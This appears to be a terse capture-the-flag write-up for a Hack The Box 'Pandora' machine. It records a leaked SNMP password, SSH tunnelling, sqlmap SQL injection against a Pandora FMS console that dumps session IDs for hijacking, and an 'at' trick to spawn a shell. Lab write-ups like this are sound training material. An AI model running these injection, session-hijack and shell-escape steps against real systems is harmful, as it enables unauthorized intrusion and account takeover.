
```php
iso.3.6.1.2.1.25.4.2.1.5.1142 = STRING: "-u daniel -p HotelBabylon23"
```

```php
cd /var/www
html pandora
```

```php
daniel@pandora:/var/www$ sudo -l
[sudo] password for daniel: 
Sorry, user daniel may not run sudo on pandora.
```

```php
ssh daniel@10.129.14.15
HotelBabylon23
```

Download and run `linpeas.sh` on the user Daniel

```
                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.14.16  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb0:d7a5  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb0:d7a5  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:d7:a5  txqueuelen 1000  (Ethernet)
        RX packets 505001  bytes 80990904 (80.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 498895  bytes 227339191 (227.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 16319  bytes 1302485 (1.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16319  bytes 1302485 (1.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

```
╔══════════╣ Users with console
daniel:x:1001:1001::/home/daniel:/bin/bash
matt:x:1000:1000:matt:/home/matt:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

Steps towards lateral movement, enumerate the remote host

```
ls -al /var/www/
drwxr-xr-x  3 root root 4096 Dec  7  2021 html
drwxr-xr-x  3 matt matt 4096 Dec  7  2021 pandora
```

```
cat /etc/apache2/sites-enabled/pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

Apache virtual host configuration

```
ssh -D 9090 daniel@10.129.14.16
```

dynamic port forwarding





nano /etc/hosts
127.0.0.1 pandora.panda.htb

ssh -L 8080:localhost:80 daniel@10.129.14.16

http://localhost:8080/pandora_console/
v7.0NG.742_FIX_PERL2020

sqlmap -u "http://localhost:8080/pandora_console/include/chart_generator.php?session_id=1" --current-db

[22:14:23] [INFO] fetching current database
[22:14:23] [INFO] retrieved: 'pandora'
current database: 'pandora'


sqlmap -u "http://localhost:8080/pandora_console/include/chart_generator.php?session_id=1" -D pandora --tables

```
Database: pandora
[178 tables]
+------------------------------------+
| taddress                           |
| taddress_agent                     |
| tagent_access                      |
| tagent_custom_data                 |
| tagent_custom_fields               |
| tagent_custom_fields_filter        |
| tagent_module_inventory            |
| tagent_module_log                  |
| tagent_repository                  |
| tagent_secondary_group             |
| tagente                            |
| tagente_datos                      |
| tagente_datos_inc                  |
| tagente_datos_inventory            |
| tagente_datos_log4x                |
| tagente_datos_string               |
| tagente_estado                     |
| tagente_modulo                     |
| talert_actions                     |
| talert_commands                    |
| talert_snmp                        |
| talert_snmp_action                 |
| talert_special_days                |
| talert_template_module_actions     |
| talert_template_modules            |
| talert_templates                   |
| tattachment                        |
| tautoconfig                        |
| tautoconfig_actions                |
| tautoconfig_rules                  |
| tcategory                          |
| tcluster                           |
| tcluster_agent                     |
| tcluster_item                      |
| tcollection                        |
| tconfig                            |
| tconfig_os                         |
| tcontainer                         |
| tcontainer_item                    |
| tcredential_store                  |
| tdashboard                         |
| tdatabase                          |
| tdeployment_hosts                  |
| tevent_alert                       |
| tevent_alert_action                |
| tevent_custom_field                |
| tevent_extended                    |
| tevent_filter                      |
| tevent_response                    |
| tevent_rule                        |
| tevento                            |
| textension_translate_string        |
| tfiles_repo                        |
| tfiles_repo_group                  |
| tgis_data_history                  |
| tgis_data_status                   |
| tgis_map                           |
| tgis_map_connection                |
| tgis_map_has_tgis_map_con          |
| tgis_map_layer                     |
| tgis_map_layer_groups              |
| tgis_map_layer_has_tagente         |
| tgraph                             |
| tgraph_source                      |
| tgraph_source_template             |
| tgraph_template                    |
| tgroup_stat                        |
| tgrupo                             |
| tincidencia                        |
| titem                              |
| tlanguage                          |
| tlayout                            |
| tlayout_data                       |
| tlayout_template                   |
| tlayout_template_data              |
| tlink                              |
| tlocal_component                   |
| tlog_graph_models                  |
| tmap                               |
| tmensajes                          |
| tmetaconsole_agent                 |
| tmetaconsole_agent_secondary_group |
| tmetaconsole_event                 |
| tmetaconsole_event_history         |
| tmetaconsole_setup                 |
| tmigration_module_queue            |
| tmigration_queue                   |
| tmodule                            |
| tmodule_group                      |
| tmodule_inventory                  |
| tmodule_relationship               |
| tmodule_synth                      |
| tnetflow_filter                    |
| tnetflow_report                    |
| tnetflow_report_content            |
| tnetwork_component                 |
| tnetwork_component_group           |
| tnetwork_map                       |
| tnetwork_matrix                    |
| tnetwork_profile                   |
| tnetwork_profile_component         |
| tnetworkmap_ent_rel_nodes          |
| tnetworkmap_enterprise             |
| tnetworkmap_enterprise_nodes       |
| tnews                              |
| tnota                              |
| tnotification_group                |
| tnotification_source               |
| tnotification_source_group         |
| tnotification_source_group_user    |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| tsnmp_filter                       |
| ttag                               |
| ttag_module                        |
| ttag_policy_module                 |
| ttipo_modulo                       |
| ttransaction                       |
| ttrap                              |
| ttrap_custom_values                |
| tupdate                            |
| tupdate_journal                    |
| tupdate_package                    |
| tupdate_settings                   |
| tuser_double_auth                  |
| tuser_task                         |
| tuser_task_scheduled               |
| tusuario                           |
| tusuario_perfil                    |
| tvisual_console_elements_cache     |
| twidget                            |
| twidget_dashboard                  |
+------------------------------------+
```

sqlmap -u "http://localhost:8080/pandora_console/include/chart_generator.php?session_id=1" -D pandora -T tsessions_php --dump

```
+----------------------------+-----------------------------------------------------+-------------+
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
| 0l4inimj93ofh0va6h5tc2hns2 | NULL                                                | 1749693953  |
| 0tvk3j9tf75cr5a639dgqimpuo | id_usuario|s:6:"daniel";                            | 1749694463  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
| 3b39ee4r8gg29j0k5b3ohm96jq | NULL                                                | 1749694685  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
| 9avqqod1023cb8djs40o817imb | NULL                                                | 1749694951  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
| bbhf4mtod74tqhv50mpdvu4lj5 | id_usuario|s:6:"daniel";                            | 1641201982  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
| db18hcjse99uocj0rvk3odip9i | NULL                                                | 1749694685  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
| f77smv5lcr389t087bumel8frc | NULL                                                | 1749694987  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
| imkovbhuhleu042hdegfqa3brj | NULL                                                | 1749694685  |
| j32caone4moj1kagn5ds2hj1hr | id_usuario|s:6:"daniel";                            | 1749676997  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
| l71d20eka6cm4lgomfsu1q0mlt | NULL                                                | 1749694951  |
| nbgm6s2kofh014ijogqvra18ef | NULL                                                | 1749694951  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
| nrvvktg10chda4uae1chd1ife2 | NULL                                                | 1749694951  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
| shpq68f1o2p433ul7njqal7e2r | NULL                                                | 1749694685  |
| u1q64beokvbn49m6ref9g5oa9o | NULL                                                | 1749694756  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
+----------------------------+-----------------------------------------------------+-------------+

```

We have sessions - `g4e01qdgk36mfdh90hvcc54umq`

```
http://localhost:8080/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
```

```php
daniel@pandora:/var/www$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

https://gtfobins.github.io/#

```php
ls -al /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
```

```php
/usr/bin/pandora_backup
bash: /usr/bin/pandora_backup: Permission denied
```

```php
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
warning: commands will be executed using /bin/sh
job 1 at Thu Jun 12 00:30:00 2025
/bin/sh: 0: can't access tty; job control turned off
```

